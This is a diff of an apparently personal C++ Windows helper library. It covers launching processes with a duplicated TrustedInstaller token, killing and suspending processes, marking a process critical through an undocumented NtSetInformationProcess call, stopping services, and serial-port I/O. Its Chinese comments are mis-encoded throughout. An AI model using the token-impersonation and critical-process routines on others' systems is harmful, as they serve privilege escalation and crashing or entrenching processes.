+	DuplicateTokenEx(hTIToken, MAXIMUM_ALLOWED, &tokenAttributes, SecurityImpersonation, TokenImpersonation, &hDupToken); //å¤åˆ¶å¸¦æœ‰TrustedInstalleræƒé™çš„ä»¤ç‰Œ
+	OpenProcessToken(GetCurrentProcess(), TOKEN_READ, &hToken);															  // è·å–æŒ‡å®šè¿›ç¨‹çš„å¥æŸ„
 
 	DWORD nBufferLength = GetCurrentDirectoryW(0, nullptr);
 	lpBuffer = (LPWSTR)(new wchar_t[nBufferLength]{0});
-	GetCurrentDirectoryW(nBufferLength, lpBuffer); //Êä³ö²Ù×÷ÏµÍ³Â·¾¶
+	GetCurrentDirectoryW(nBufferLength, lpBuffer); //è¾“å‡ºæ“ä½œç³»ç»Ÿè·¯å¾„
 
 	STARTUPINFOW startupInfo;
 	ZeroMemory(&startupInfo, sizeof(STARTUPINFOW));
@@ -335,17 +335,17 @@ bool UseTrustedInstaller(const char *exec)
 	PROCESS_INFORMATION processInfo;
 	ZeroMemory(&processInfo, sizeof(PROCESS_INFORMATION));
 
-	return CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, nullptr, wexec, CREATE_UNICODE_ENVIRONMENT, lpEnvironment, lpBuffer, &startupInfo, &processInfo); //´ò¿ª
+	return CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, nullptr, wexec, CREATE_UNICODE_ENVIRONMENT, lpEnvironment, lpBuffer, &startupInfo, &processInfo); //æ‰“å¼€
 }
 
-//È¨ÏŞ²Ù×÷½áÊø
+//æƒé™æ“ä½œç»“æŸ
 
-//½ø³Ì²Ù×÷¿ªÊ¼
+//è¿›ç¨‹æ“ä½œå¼€å§‹
 
 /**************************************************
- *  @brief          ½áÊø½ø³Ì
- *  @param          szImageName:½ø³ÌÃû
- *  @note           Í·ÎÄ¼ş£º #include <Windows.h> #include <TlHelp32.h> #include <string>
+ *  @brief          ç»“æŸè¿›ç¨‹
+ *  @param          szImageName:è¿›ç¨‹å
+ *  @note           å¤´æ–‡ä»¶ï¼š #include <Windows.h> #include <TlHelp32.h> #include <string>
  *  @Sample usage 	KillProcess("cmd.exe");
  *  @author         xbebhxx3
  *  @version        2.0
@@ -354,27 +354,27 @@ bool UseTrustedInstaller(const char *exec)
  **************************************************/
 void KillProcess(const char *szImageName)
 {
-	PROCESSENTRY32 pe = {sizeof(PROCESSENTRY32)};					   //»ñµÃ½ø³ÌÁĞ±í
-	HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //ÅÄÉã¿ìÕÕ
-	BOOL bRet = Process32First(hProcess, &pe);						   //¼ìË÷¿ìÕÕÖĞµÚÒ»¸ö½ø³ÌĞÅÏ¢
+	PROCESSENTRY32 pe = {sizeof(PROCESSENTRY32)};					   //è·å¾—è¿›ç¨‹åˆ—è¡¨
+	HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //æ‹æ‘„å¿«ç…§
+	BOOL bRet = Process32First(hProcess, &pe);						   //æ£€ç´¢å¿«ç…§ä¸­ç¬¬ä¸€ä¸ªè¿›ç¨‹ä¿¡æ¯
 
 	while (bRet)
-	{ //ÅĞ¶Ï²»ÊÇ×îºóÒ»¸ö½ø³Ì£¬Àú±éËùÓĞ
+	{ //åˆ¤æ–­ä¸æ˜¯æœ€åä¸€ä¸ªè¿›ç¨‹ï¼Œå†éæ‰€æœ‰
 		if (lstrcmp(szImageName, pe.szExeFile) == 0)
-		{																				   //ÅĞ¶ÏÊÇ²»ÊÇÒª½áÊøµÄ½ø³Ì
-			TerminateProcess(OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID), 0); //´ò¿ª½ø³Ì²¢É±ËÀ
+		{																				   //åˆ¤æ–­æ˜¯ä¸æ˜¯è¦ç»“æŸçš„è¿›ç¨‹
+			TerminateProcess(OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID), 0); //æ‰“å¼€è¿›ç¨‹å¹¶æ€æ­»
 		}
-		bRet = Process32Next(hProcess, &pe); //ÏÂÒ»¸ö½ø³Ì
+		bRet = Process32Next(hProcess, &pe); //ä¸‹ä¸€ä¸ªè¿›ç¨‹
 	}
 	return;
 }
 
 /**************************************************
- *  @brief          ÅĞ¶Ï½ø³ÌÊÇ·ñ´æÔÚ ,²¢·µ»Ø½ø³Ìid
- *  @param          szImageName:½ø³ÌÃû
- *  @note           Í·ÎÄ¼ş£º #include <Windows.h> #include <TlHelp32.h> #include <string>
+ *  @brief          åˆ¤æ–­è¿›ç¨‹æ˜¯å¦å­˜åœ¨ ,å¹¶è¿”å›è¿›ç¨‹id
+ *  @param          szImageName:è¿›ç¨‹å
+ *  @note           å¤´æ–‡ä»¶ï¼š #include <Windows.h> #include <TlHelp32.h> #include <string>
  *  @Sample usage 	isProcess("cmd.exe");
- * 	@return         0²»´æÔÚ ·Ç0Îª½ø³Ìid
+ * 	@return         0ä¸å­˜åœ¨ é0ä¸ºè¿›ç¨‹id
  * 	@author         xbebhxx3
  * 	@version        1.0
  * 	@date           2022/3/15
@@ -382,25 +382,25 @@ void KillProcess(const char *szImageName)
  **************************************************/
 int isProcess(const char *szImageName)
 {
-	PROCESSENTRY32 pe = {sizeof(PROCESSENTRY32)};					   //»ñµÃ½ø³ÌÁĞ±í
-	HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //ÅÄÉã¿ìÕÕ
-	BOOL bRet = Process32First(hProcess, &pe);						   //¼ìË÷¿ìÕÕÖĞµÚÒ»¸ö½ø³ÌĞÅÏ¢
+	PROCESSENTRY32 pe = {sizeof(PROCESSENTRY32)};					   //è·å¾—è¿›ç¨‹åˆ—è¡¨
+	HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //æ‹æ‘„å¿«ç…§
+	BOOL bRet = Process32First(hProcess, &pe);						   //æ£€ç´¢å¿«ç…§ä¸­ç¬¬ä¸€ä¸ªè¿›ç¨‹ä¿¡æ¯
 
 	while (bRet)
-	{ //²»ÊÇ×îºóÒ»¸ö½ø³Ì£¬Àú±éËùÓĞ
+	{ //ä¸æ˜¯æœ€åä¸€ä¸ªè¿›ç¨‹ï¼Œå†éæ‰€æœ‰
 		if (lstrcmp(szImageName, pe.szExeFile) == 0)
-			return pe.th32ProcessID;		 //·µ»Ø½ø³Ìid
-		bRet = Process32Next(hProcess, &pe); //ÏÂÒ»¸ö½ø³Ì
+			return pe.th32ProcessID;		 //è¿”å›è¿›ç¨‹id
+		bRet = Process32Next(hProcess, &pe); //ä¸‹ä¸€ä¸ªè¿›ç¨‹
 	}
 	return 0;
 }
 
 /**************************************************
- *  @brief          »ñµÃ½ø³ÌÂ·¾¶
- *  @param          szImageName:½ø³ÌÃû
- *  @note           Í·ÎÄ¼ş£º #include <Windows.h> #include <TlHelp32.h> #include <string>
+ *  @brief          è·å¾—è¿›ç¨‹è·¯å¾„
+ *  @param          szImageName:è¿›ç¨‹å
+ *  @note           å¤´æ–‡ä»¶ï¼š #include <Windows.h> #include <TlHelp32.h> #include <string>
  *  @Sample usage   GetProcesslocation("cmd.exe");
- * 	@return  	    0²»´æÔÚ ·Ç0Îª½ø³ÌÎ»ÖÃ
+ * 	@return  	    0ä¸å­˜åœ¨ é0ä¸ºè¿›ç¨‹ä½ç½®
  *  @calls          isProcess
  * 	@author         xbebhxx3
  * 	@version        1.0
@@ -411,28 +411,28 @@ string GetProcesslocation(const char *szImageName)
 {
 	if (isProcess(szImageName) == 0)
 		return "0";
-	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // ´´½¨½ø³Ì¿ìÕÕ
-	PROCESSENTRY32 process = {sizeof(PROCESSENTRY32)};					   // ÓÃÀ´½ÓÊÕ hProcessSnap µÄĞÅÏ¢
+	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // åˆ›å»ºè¿›ç¨‹å¿«ç…§
+	PROCESSENTRY32 process = {sizeof(PROCESSENTRY32)};					   // ç”¨æ¥æ¥æ”¶ hProcessSnap çš„ä¿¡æ¯
 	while (Process32Next(hProcessSnap, &process))
-	{											// ±éÀú½ø³Ì¿ìÕÕ
-		string processName = process.szExeFile; // char* ×ª string
-		if (processName == szImageName)			// ÕÒµ½½ø³Ì
+	{											// éå†è¿›ç¨‹å¿«ç…§
+		string processName = process.szExeFile; // char* è½¬ string
+		if (processName == szImageName)			// æ‰¾åˆ°è¿›ç¨‹
 		{
-			//»ñµÃ½ø³ÌÂ·¾¶
-			PROCESSENTRY32 *pinfo = new PROCESSENTRY32;		//½ø³ÌĞÅÏ¢ £¨pinfo->dwSize = sizeof(PROCESSENTRY32);£©
-			MODULEENTRY32 *minfo = new MODULEENTRY32;		//Ä£¿éĞÅÏ¢ £¨minfo->dwSize = sizeof(MODULEENTRY32);£©
-			char shortpath[MAX_PATH];						//±£´æÂ·¾¶±äÁ¿
-			int flag = Process32First(hProcessSnap, pinfo); // ´ÓµÚÒ»¸ö½ø³Ì¿ªÊ¼
+			//è·å¾—è¿›ç¨‹è·¯å¾„
+			PROCESSENTRY32 *pinfo = new PROCESSENTRY32;		//è¿›ç¨‹ä¿¡æ¯ ï¼ˆpinfo->dwSize = sizeof(PROCESSENTRY32);ï¼‰
+			MODULEENTRY32 *minfo = new MODULEENTRY32;		//æ¨¡å—ä¿¡æ¯ ï¼ˆminfo->dwSize = sizeof(MODULEENTRY32);ï¼‰
+			char shortpath[MAX_PATH];						//ä¿å­˜è·¯å¾„å˜é‡
+			int flag = Process32First(hProcessSnap, pinfo); // ä»ç¬¬ä¸€ä¸ªè¿›ç¨‹å¼€å§‹
 			while (flag)
 			{
 				if (strcmp(pinfo->szExeFile, szImageName) == 0)
-				{																						// Èç¹ûÊÇÕâ¸ö½ø³Ì
-					HANDLE hModule = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pinfo->th32ProcessID); // ´´½¨½ø³Ì¿ìÕÕ
-					Module32First(hModule, minfo);														// °ÑµÚÒ»¸öÄ£¿éĞÅÏ¢¸ø minfo
-					GetShortPathName(minfo->szExePath, shortpath, 256);									// °ÑÎÄ¼şÂ·¾¶¸ø shortpath
+				{																						// å¦‚æœæ˜¯è¿™ä¸ªè¿›ç¨‹
+					HANDLE hModule = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pinfo->th32ProcessID); // åˆ›å»ºè¿›ç¨‹å¿«ç…§
+					Module32First(hModule, minfo);														// æŠŠç¬¬ä¸€ä¸ªæ¨¡å—ä¿¡æ¯ç»™ minfo
+					GetShortPathName(minfo->szExePath, shortpath, 256);									// æŠŠæ–‡ä»¶è·¯å¾„ç»™ shortpath
 					break;
 				}
-				flag = Process32Next(hProcessSnap, pinfo); // ÏÂÒ»¸ö½ø³Ì
+				flag = Process32Next(hProcessSnap, pinfo); // ä¸‹ä¸€ä¸ªè¿›ç¨‹
 			}
 			return shortpath;
 			break;
@@ -441,12 +441,12 @@ string GetProcesslocation(const char *szImageName)
 }
 
 /**************************************************
- *  @brief          ¹ÒÆğ½ø³Ì
- *  @param          dwProcessID:½ø³ÌID,fSuspend: TRUE¹ÒÆğ,FALSE½â³ı
- *  @note           Í·ÎÄ¼ş£º #include <Windows.h> #include <TlHelp32.h>
+ *  @brief          æŒ‚èµ·è¿›ç¨‹
+ *  @param          dwProcessID:è¿›ç¨‹ID,fSuspend: TRUEæŒ‚èµ·,FALSEè§£é™¤
+ *  @note           å¤´æ–‡ä»¶ï¼š #include <Windows.h> #include <TlHelp32.h>
  *  @Sample usage   SuspendProcess(isProcess("cmd.exe"),1);
  *  @calls          Debug
- * 	@return     	1³É¹¦£¬0 Ê§°Ü
+ * 	@return     	1æˆåŠŸï¼Œ0 å¤±è´¥
  * 	@author         xbebhxx3
  * 	@version        1.0
  * 	@date           2022/5/18
@@ -456,39 +456,39 @@ bool SuspendProcess(DWORD dwProcessID, BOOL fSuspend)
 {
 	bool ret = 1;
 
-	Debug(); //»ñµÃdebugÈ¨ÏŞ
+	Debug(); //è·å¾—debugæƒé™
 
-	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwProcessID); //»ñµÃ½ø³Ì¿ìÕÕ
-	if (hSnapshot != INVALID_HANDLE_VALUE)										 //½ø³Ì´æÔÚ
+	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwProcessID); //è·å¾—è¿›ç¨‹å¿«ç…§
+	if (hSnapshot != INVALID_HANDLE_VALUE)										 //è¿›ç¨‹å­˜åœ¨
 	{
 		THREADENTRY32 te = {sizeof(te)};
-		BOOL fOk = Thread32First(hSnapshot, &te);		//´ò¿ª½ø³Ì
-		for (; fOk; fOk = Thread32Next(hSnapshot, &te)) //µ±Ç°·Ç×îºóÒ»¸ö½ø³Ì£¬ÏÂÒ»¸ö
+		BOOL fOk = Thread32First(hSnapshot, &te);		//æ‰“å¼€è¿›ç¨‹
+		for (; fOk; fOk = Thread32Next(hSnapshot, &te)) //å½“å‰éæœ€åä¸€ä¸ªè¿›ç¨‹ï¼Œä¸‹ä¸€ä¸ª
 			if (te.th32OwnerProcessID == dwProcessID)
 			{
 				if (fSuspend)
 				{
-					if (SuspendThread(OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID)) == -1) //¹ÒÆğ
+					if (SuspendThread(OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID)) == -1) //æŒ‚èµ·
 						ret = 0;
 				}
 				else
 				{
-					if (ResumeThread(OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID)) == -1) //È¡Ïû¹ÒÆğ
+					if (ResumeThread(OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID)) == -1) //å–æ¶ˆæŒ‚èµ·
 						ret = 0;
 				}
 			}
-		CloseHandle(OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID)); //¹Ø±Õ¿ìÕÕ
+		CloseHandle(OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID)); //å…³é—­å¿«ç…§
 	}
-	CloseHandle(hSnapshot); //¹Ø±Õ¿ìÕÕ
+	CloseHandle(hSnapshot); //å…³é—­å¿«ç…§
 	return ret;
 }
 
 /**************************************************
- *  @brief          ÉèÖÃ/½â³ı¹Ø¼ü½ø³Ì
- *  @param          id:½ø³Ìid ,fSuspend:1¹Ø¼ü£¬0ÆÕÍ¨
- *  @note           Í·ÎÄ¼ş£º #include <Windows.h> #include <TlHelp32.h>
+ *  @brief          è®¾ç½®/è§£é™¤å…³é”®è¿›ç¨‹
+ *  @param          id:è¿›ç¨‹id ,fSuspend:1å…³é”®ï¼Œ0æ™®é€š
+ *  @note           å¤´æ–‡ä»¶ï¼š #include <Windows.h> #include <TlHelp32.h>
  *  @Sample usage 	CriticalProcess(1000,1);
- * 	@return      	1³É¹¦£¬0Ê§°Ü
+ * 	@return      	1æˆåŠŸï¼Œ0å¤±è´¥
  *  @calls          Debug
  * 	@author         xbebhxx3
  * 	@version        1.0
@@ -498,23 +498,23 @@ bool SuspendProcess(DWORD dwProcessID, BOOL fSuspend)
 typedef NTSTATUS(NTAPI *_NtSetInformationProcess)(HANDLE ProcessHandle, PROCESS_INFORMATION_CLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength);
 bool CriticalProcess(DWORD dwProcessID, BOOL fSuspend)
 {
-	Debug(); //»ñµÃdebugÈ¨ÏŞ
+	Debug(); //è·å¾—debugæƒé™
 
-	_NtSetInformationProcess NtSetInformationProcess = (_NtSetInformationProcess)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtSetInformationProcess"); //¼ÓÔØntdll
-	if (!NtSetInformationProcess)																														   //¼ÓÔØÊ§°Ü£¬ÍË³ö
+	_NtSetInformationProcess NtSetInformationProcess = (_NtSetInformationProcess)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtSetInformationProcess"); //åŠ è½½ntdll
+	if (!NtSetInformationProcess)																														   //åŠ è½½å¤±è´¥ï¼Œé€€å‡º
 		return 0;
-	if (NtSetInformationProcess(OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID), (PROCESS_INFORMATION_CLASS)29, &fSuspend, sizeof(ULONG)) < 0) //ÉèÖÃ½ø³Ì
-		return 0;																																   //ÉèÖÃÊ§°Ü£¬ÍË³ö
+	if (NtSetInformationProcess(OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID), (PROCESS_INFORMATION_CLASS)29, &fSuspend, sizeof(ULONG)) < 0) //è®¾ç½®è¿›ç¨‹
+		return 0;																																   //è®¾ç½®å¤±è´¥ï¼Œé€€å‡º
 	else
 		return 1;
 }
 
 /**************************************************
- *  @brief          Í£Ö¹·şÎñ
- *  @param          ·şÎñÃû
- *  @note           Í·ÎÄ¼ş£º #include <Windows.h> #include <TlHelp32.h>
+ *  @brief          åœæ­¢æœåŠ¡
+ *  @param          æœåŠ¡å
+ *  @note           å¤´æ–‡ä»¶ï¼š #include <Windows.h> #include <TlHelp32.h>
  *  @Sample usage 	CriticalProcess("CryptSvc");
- * 	@return  	    1³É¹¦£¬0Ê§°Ü
+ * 	@return  	    1æˆåŠŸï¼Œ0å¤±è´¥
  * 	@author         xbebhxx3
  * 	@version        1.0
  * 	@date           2022/9/7
@@ -522,61 +522,61 @@ bool CriticalProcess(DWORD dwProcessID, BOOL fSuspend)
  **************************************************/
 bool CloseService(char *service)
 {
-	SC_HANDLE hSC = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); //´ò¿ª·şÎñ¹ÜÀíÆ÷
+	SC_HANDLE hSC = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); //æ‰“å¼€æœåŠ¡ç®¡ç†å™¨
 	if (hSC == NULL)
 		return false;
 
-	SC_HANDLE hSvc = ::OpenService(hSC, service, SERVICE_START | SERVICE_QUERY_STATUS | SERVICE_STOP); //´ò¿ª·şÎñ
+	SC_HANDLE hSvc = ::OpenService(hSC, service, SERVICE_START | SERVICE_QUERY_STATUS | SERVICE_STOP); //æ‰“å¼€æœåŠ¡
 	if (hSvc == NULL)
 	{
 		CloseServiceHandle(hSC);
-		return false; //´ò¿ª·şÎñ¹ÜÀíÆ÷Ê§°Ü£¬¹Ø±ÕHANDLEÍË³ö
+		return false; //æ‰“å¼€æœåŠ¡ç®¡ç†å™¨å¤±è´¥ï¼Œå…³é—­HANDLEé€€å‡º
 	}
 	SERVICE_STATUS status;
-	if (QueryServiceStatus(hSvc, &status) == FALSE) //»ñµÃ·şÎñ×´Ì¬
+	if (QueryServiceStatus(hSvc, &status) == FALSE) //è·å¾—æœåŠ¡çŠ¶æ€
 	{
 		CloseServiceHandle(hSvc);
 		CloseServiceHandle(hSC);
-		return false; //²éÑ¯·şÎñ×´Ì¬Ê§°Ü£¬¹Ø±ÕHANDLEÍË³ö
+		return false; //æŸ¥è¯¢æœåŠ¡çŠ¶æ€å¤±è´¥ï¼Œå…³é—­HANDLEé€€å‡º
 	}
-	if (status.dwCurrentState == SERVICE_RUNNING) //Èç¹ûÕıÔÚÔËĞĞ£¬Í£Ö¹·şÎñ
+	if (status.dwCurrentState == SERVICE_RUNNING) //å¦‚æœæ­£åœ¨è¿è¡Œï¼Œåœæ­¢æœåŠ¡
 	{
 		if (ControlService(hSvc, SERVICE_CONTROL_STOP, &status) == FALSE)
 		{
 			CloseServiceHandle(hSvc);
 			CloseServiceHandle(hSC);
-			return false; //Í£Ö¹·şÎñÊ§°Ü£¬¹Ø±ÕHANDLEÍË³ö
+			return false; //åœæ­¢æœåŠ¡å¤±è´¥ï¼Œå…³é—­HANDLEé€€å‡º
 		}
-		while (::QueryServiceStatus(hSvc, &status) == TRUE) //µÈ´ı·şÎñÍ£Ö¹
+		while (::QueryServiceStatus(hSvc, &status) == TRUE) //ç­‰å¾…æœåŠ¡åœæ­¢
 		{
 			Sleep(status.dwWaitHint);
-			if (status.dwCurrentState == SERVICE_STOPPED) //·şÎñÒÑ¾­Í£Ö¹
+			if (status.dwCurrentState == SERVICE_STOPPED) //æœåŠ¡å·²ç»åœæ­¢
 			{
 				CloseServiceHandle(hSvc);
 				CloseServiceHandle(hSC);
-				return true; //·şÎñÒÑÍ£Ö¹£¬¹Ø±ÕHANDLEÍË³ö
+				return true; //æœåŠ¡å·²åœæ­¢ï¼Œå…³é—­HANDLEé€€å‡º
 			}
 		}
 	}
 
 	CloseServiceHandle(hSvc);
 	CloseServiceHandle(hSC);
-	return true; //·şÎñÒÑÍ£Ö¹£¬¹Ø±ÕHANDLEÍË³ö
+	return true; //æœåŠ¡å·²åœæ­¢ï¼Œå…³é—­HANDLEé€€å‡º
 }
 
-//½ø³Ì²Ù×÷½áÊø
+//è¿›ç¨‹æ“ä½œç»“æŸ
 
-//´®¿Ú²Ù×÷¿ªÊ¼
+//ä¸²å£æ“ä½œå¼€å§‹
 
 /**************************************************
- *  @brief         ´®¿Ú²Ù×÷
+ *  @brief         ä¸²å£æ“ä½œ
  *  @Sample usage
-	SerialPort w;//Ê¹ÓÃ£¬²»ÊÇ±ØĞëÓÃw
-	w.open("\\\\.\\COM7");//´ò¿ªCOM7 ²»ÊÇ±ØĞëÓÃCOM7
-	w.close()//¹Ø±Õ
-	w.send("at\r");//·¢ËÍ
-	w.receive()£»//½ÓÊÕ
- *  @note           Í·ÎÄ¼ş£º #include <Windows.h>
+	SerialPort w;//ä½¿ç”¨ï¼Œä¸æ˜¯å¿…é¡»ç”¨w
+	w.open("\\\\.\\COM7");//æ‰“å¼€COM7 ä¸æ˜¯å¿…é¡»ç”¨COM7
+	w.close()//å…³é—­
+	w.send("at\r");//å‘é€
+	w.receive()ï¼›//æ¥æ”¶
+ *  @note           å¤´æ–‡ä»¶ï¼š #include <Windows.h>
  * 	@author         xbebhxx3
  * 	@version        5.0
  * 	@date           2022/8/12
@@ -587,10 +587,10 @@ class SerialPort
 public:
 	SerialPort();
 	~SerialPort();
-	bool open(const char *portname, int baudrate, char parity, char databit, char stopbit, char synchronizeflag); // ´ò¿ª´®¿Ú,³É¹¦·µ»Øtrue£¬Ê§°Ü·µ»Øfalse
-	void close();																								  //¹Ø±Õ´®¿Ú
-	int send(string dat);																						  //·¢ËÍÊı¾İ»òĞ´Êı¾İ£¬³É¹¦·µ»Ø·¢ËÍÊı¾İ³¤¶È£¬Ê§°Ü·µ»Ø0
-	string receive();																							  //½ÓÊÕÊı¾İ»ò¶ÁÊı¾İ£¬³É¹¦·µ»Ø¶ÁÈ¡Êµ¼ÊÊı¾İµÄ³¤¶È£¬Ê§°Ü·µ»Ø0
+	bool open(const char *portname, int baudrate, char parity, char databit, char stopbit, char synchronizeflag); // æ‰“å¼€ä¸²å£,æˆåŠŸè¿”å›trueï¼Œå¤±è´¥è¿”å›false
+	void close();																								  //å…³é—­ä¸²å£
+	int send(string dat);																						  //å‘é€æ•°æ®æˆ–å†™æ•°æ®ï¼ŒæˆåŠŸè¿”å›å‘é€æ•°æ®é•¿åº¦ï¼Œå¤±è´¥è¿”å›0
+	string receive();																							  //æ¥æ”¶æ•°æ®æˆ–è¯»æ•°æ®ï¼ŒæˆåŠŸè¿”å›è¯»å–å®é™…æ•°æ®çš„é•¿åº¦ï¼Œå¤±è´¥è¿”å›0
 private:
 	int pHandle[16];
 	char synchronizeflag;
@@ -598,17 +598,17 @@ private:
 SerialPort::SerialPort() {}
 SerialPort::~SerialPort() {}
 /**************************************************
- *  @brief          ´ò¿ª´®¿Ú
+ *  @brief          æ‰“å¼€ä¸²å£
  *  @param
-	portname(´®¿ÚÃû): ÔÚWindowsÏÂÊÇ"COM1""COM2"µÈ£¬ÔÚLinuxÏÂÊÇ"/dev/ttyS1"µÈ
-	baudrate(²¨ÌØÂÊ): 9600¡¢19200¡¢38400¡¢43000¡¢56000¡¢57600¡¢115200
-	parity(Ğ£ÑéÎ»): 0ÎªÎŞĞ£Ñé£¬1ÎªÆæĞ£Ñé£¬2ÎªÅ¼Ğ£Ñé£¬3Îª±ê¼ÇĞ£Ñé
-	databit(Êı¾İÎ»): 4-8£¬Í¨³£Îª8Î»
-	stopbit(Í£Ö¹Î»): 1Îª1Î»Í£Ö¹Î»£¬2Îª2Î»Í£Ö¹Î»,3Îª1.5Î»Í£Ö¹Î»
-	synchronizable(Í¬²½¡¢Òì²½): 0ÎªÒì²½£¬1ÎªÍ¬²½
- *  @note           ·Ç¶ÀÁ¢Ä£¿é
- *  @Sample usage 	open(¶Ë¿ÚºÅ);
- * 	@return         ³É¹¦·µ»Øtrue£¬Ê§°Ü·µ»Øfalse
+	portname(ä¸²å£å): åœ¨Windowsä¸‹æ˜¯"COM1""COM2"ç­‰ï¼Œåœ¨Linuxä¸‹æ˜¯"/dev/ttyS1"ç­‰
+	baudrate(æ³¢ç‰¹ç‡): 9600ã€19200ã€38400ã€43000ã€56000ã€57600ã€115200
+	parity(æ ¡éªŒä½): 0ä¸ºæ— æ ¡éªŒï¼Œ1ä¸ºå¥‡æ ¡éªŒï¼Œ2ä¸ºå¶æ ¡éªŒï¼Œ3ä¸ºæ ‡è®°æ ¡éªŒ
+	databit(æ•°æ®ä½): 4-8ï¼Œé€šå¸¸ä¸º8ä½
+	stopbit(åœæ­¢ä½): 1ä¸º1ä½åœæ­¢ä½ï¼Œ2ä¸º2ä½åœæ­¢ä½,3ä¸º1.5ä½åœæ­¢ä½
+	synchronizable(åŒæ­¥ã€å¼‚æ­¥): 0ä¸ºå¼‚æ­¥ï¼Œ1ä¸ºåŒæ­¥
+ *  @note           éç‹¬ç«‹æ¨¡å—
+ *  @Sample usage 	open(ç«¯å£å·);
+ * 	@return         æˆåŠŸè¿”å›trueï¼Œå¤±è´¥è¿”å›false
  * 	@author         xbebhxx3
  * 	@version        2.0
  * 	@date           2022/8/13
@@ -619,66 +619,66 @@ bool SerialPort::open(const char *portname, int baudrate = 115200, char parity =
 	this->synchronizeflag = synchronizeflag;
 	HANDLE hCom = NULL;
 	if (this->synchronizeflag)
-		hCom = CreateFileA(portname, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); //Í¬²½·½Ê½
+		hCom = CreateFileA(portname, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); //åŒæ­¥æ–¹å¼
 	else
-		hCom = CreateFileA(portname, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL); //Òì²½·½Ê½
+		hCom = CreateFileA(portname, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL); //å¼‚æ­¥æ–¹å¼
 	if (hCom == (HANDLE)-1)
 		return false;
 	if (!SetupComm(hCom, 1024, 1024))
-		return false; //ÅäÖÃ»º³åÇø´óĞ¡
-	// ÅäÖÃ²ÎÊı
+		return false; //é…ç½®ç¼“å†²åŒºå¤§å°
+	// é…ç½®å‚æ•°
 	DCB p;
 	memset(&p, 0, sizeof(p));
 	p.DCBlength = sizeof(p);
-	p.BaudRate = baudrate; // ²¨ÌØÂÊ
-	p.ByteSize = databit;  // Êı¾İÎ»
-	switch (parity)		   //Ğ£ÑéÎ»
+	p.BaudRate = baudrate; // æ³¢ç‰¹ç‡
+	p.ByteSize = databit;  // æ•°æ®ä½
+	switch (parity)		   //æ ¡éªŒä½
 	{
 	case 0:
-		p.Parity = NOPARITY; //ÎŞĞ£Ñé
+		p.Parity = NOPARITY; //æ— æ ¡éªŒ
 		break;
 	case 1:
-		p.Parity = ODDPARITY; //ÆæĞ£Ñé
+		p.Parity = ODDPARITY; //å¥‡æ ¡éªŒ
 		break;
 	case 2:
-		p.Parity = EVENPARITY; //Å¼Ğ£Ñé
+		p.Parity = EVENPARITY; //å¶æ ¡éªŒ
 		break;
 	case 3:
-		p.Parity = MARKPARITY; //±ê¼ÇĞ£Ñé
+		p.Parity = MARKPARITY; //æ ‡è®°æ ¡éªŒ
 		break;
 	}
-	switch (stopbit) //Í£Ö¹Î»
+	switch (stopbit) //åœæ­¢ä½
 	{
 	case 1:
-		p.StopBits = ONESTOPBIT; // 1Î»Í£Ö¹Î»
+		p.StopBits = ONESTOPBIT; // 1ä½åœæ­¢ä½
 		break;
 	case 2:
-		p.StopBits = TWOSTOPBITS; // 2Î»Í£Ö¹Î»
+		p.StopBits = TWOSTOPBITS; // 2ä½åœæ­¢ä½
 		break;
 	case 3:
-		p.StopBits = ONE5STOPBITS; // 1.5Î»Í£Ö¹Î»
+		p.StopBits = ONE5STOPBITS; // 1.5ä½åœæ­¢ä½
 		break;
 	}
 	if (!SetCommState(hCom, &p))
-		return false;							// ÉèÖÃ²ÎÊıÊ§°Ü
-	COMMTIMEOUTS TimeOuts;						//³¬Ê±´¦Àí,µ¥Î»£ººÁÃë£¬×Ü³¬Ê±£½Ê±¼äÏµÊı¡Á¶Á»òĞ´µÄ×Ö·ûÊı£«Ê±¼ä³£Á¿
-	TimeOuts.ReadIntervalTimeout = 1000;		//¶Á¼ä¸ô³¬Ê±
-	TimeOuts.ReadTotalTimeoutMultiplier = 500;	//¶ÁÊ±¼äÏµÊı
-	TimeOuts.ReadTotalTimeoutConstant = 5000;	//¶ÁÊ±¼ä³£Á¿
-	TimeOuts.WriteTotalTimeoutMultiplier = 500; // Ğ´Ê±¼äÏµÊı
-	TimeOuts.WriteTotalTimeoutConstant = 2000;	//Ğ´Ê±¼ä³£Á¿
+		return false;							// è®¾ç½®å‚æ•°å¤±è´¥
